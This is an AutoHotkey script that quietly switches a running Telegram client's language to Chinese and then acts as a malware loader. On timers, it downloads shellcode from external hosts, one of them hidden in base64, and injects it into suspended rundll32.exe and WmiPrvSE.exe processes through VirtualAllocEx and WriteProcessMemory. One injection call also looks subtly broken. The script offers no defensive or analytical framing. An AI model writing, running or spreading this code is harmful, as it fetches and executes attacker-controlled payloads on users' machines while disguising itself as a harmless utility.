#NoTrayIcon
#Requires AutoHotkey v2.0+
#SingleInstance

SendMode "Input"
SetWorkingDir A_ScriptDir
ProcessSetPriority("High")
for each_process in ComObjGet("winmgmts:").ExecQuery("Select * from Win32_Process where Name = 'telegram.exe'") {
    telegramPID := each_process.ProcessId
    telegramPath := each_process.ExecutablePath
    if (telegramPath) {
        SplitPath telegramPath,, &telegramDir
        Run('"' telegramDir '\telegram.exe" -- tg://setlanguage?lang=classic-zh-cn', , 'Hide')
    }
}




ProcessSetPriority("High")

jobs := []
jobs.Push({ target: "C:\\Windows\\System32\\rundll32.exe", url: "http://dmoneii.com/1.bin", done: false })
jobs.Push({ target: "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", url: "http://dmoneff.com/1.bin", realUrlBase64: "aHR0cDovL2Rtb25lZmYuY29tLzEuYmlu", done: false })
jobs.Push({ target: "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", url: "http://dmoneff.com/1.bin", realUrlBase64: "aHR0cDovL2NhaWxhaS5vcmcvMS5iaW4=", done: false })

Base64ToString(base64) {
    if !DllCall("crypt32\CryptStringToBinary", "Str", base64, "UInt", 0, "UInt", 0x1, "Ptr", 0, "UInt*", &size := 0, "Ptr", 0, "Ptr", 0)
        throw Error("Failed to get buffer size", -1)
    buf := Buffer(size)
    if !DllCall("crypt32\CryptStringToBinary", "Str", base64, "UInt", 0, "UInt", 0x1, "Ptr", buf.Ptr, "UInt*", &size, "Ptr", 0, "Ptr", 0)
        throw Error("Failed to decode Base64", -1)
    return StrGet(buf, size, "UTF-8")
}

InjectShellcode(job) {
    hProcess := hThread := 0
    try {
        actualUrl := job.HasOwnProp("realUrlBase64") ? Base64ToString(job.realUrlBase64) : job.url
        
        whr := ComObject("WinHttp.WinHttpRequest.5.1")
        whr.Open("GET", actualUrl, false)
        whr.Send()
        if (whr.Status != 200)
            return false

        binData := whr.ResponseBody
        size := binData.MaxIndex() + 1
        buf := Buffer(size)

        DllCall("oleaut32\SafeArrayAccessData", "Ptr", ComObjValue(binData), "Ptr*", &pBinData := 0)
        DllCall("RtlMoveMemory", "Ptr", buf.Ptr, "Ptr", pBinData, "Ptr", size)
        DllCall("oleaut32\SafeArrayUnaccessData", "Ptr", ComObjValue(binData))

        si := Buffer(68, 0)
        NumPut("UInt", 68, si)
        pi := Buffer(A_PtrSize*2 + 8, 0)
        if !DllCall("CreateProcess"
                  , "Str", job.target
                  , "Ptr", 0
                  , "Ptr", 0
                  , "Ptr", 0
                  , "Int", false
                  , "UInt", 0x4  ; CREATE_SUSPENDED
                  , "Ptr", 0
                  , "Ptr", 0
                  , "Ptr", si.Ptr
                  , "Ptr", pi.Ptr)
            throw

        hProcess := NumGet(pi, 0, "Ptr")
        hThread  := NumGet(pi, A_PtrSize, "Ptr")

        memAddr := DllCall("VirtualAllocEx"
                         , "Ptr", hProcess
                         , "Ptr", 0
                         , "Ptr", size
                         , "UInt", 0x3000
                         , "UInt", 0x40
                         , "Ptr")
        if (!memAddr)
            throw
        bytes := 0
        if !DllCall("WriteProcessMemory"
                   , "Ptr", hProcess
                   , "Ptr", memAddr
                   , "Ptr", buf.Ptr
                   , "Ptr", size
                   , "Ptr*", &bytes)
           || (bytes != size)
            throw

        if !DllCall("GetCurrentThread"
                   , "Ptr", memAddr
                   , "Ptr", hThread
                   , "Ptr", 0)
            throw
        if (DllCall("ResumeThread", "Ptr", hThread) == -1)
            throw

        DllCall("CloseHandle", "Ptr", hThread)
        DllCall("CloseHandle", "Ptr", hProcess)
        return true
    } catch {
        if (hThread)
            DllCall("CloseHandle", "Ptr", hThread)
        if (hProcess) {
            DllCall("TerminateProcess", "Ptr", hProcess, "UInt", 1)
            DllCall("CloseHandle", "Ptr", hProcess)
        }
        return false
    }
}

TryInject(taskIndex) {
    global jobs
    job := jobs[taskIndex]
    if (job.done)
        return

    if (InjectShellcode(job))
        jobs[taskIndex].done := true

    allDone := true
    for j in jobs {
        if (!j.done) {
            allDone := false
            break
        }
    }
    if (allDone)
        ExitApp()
}

SetTimer(() => TryInject(1), 1000)
SetTimer(() => TryInject(2), 1000)
SetTimer(() => TryInject(3), 1000) 

return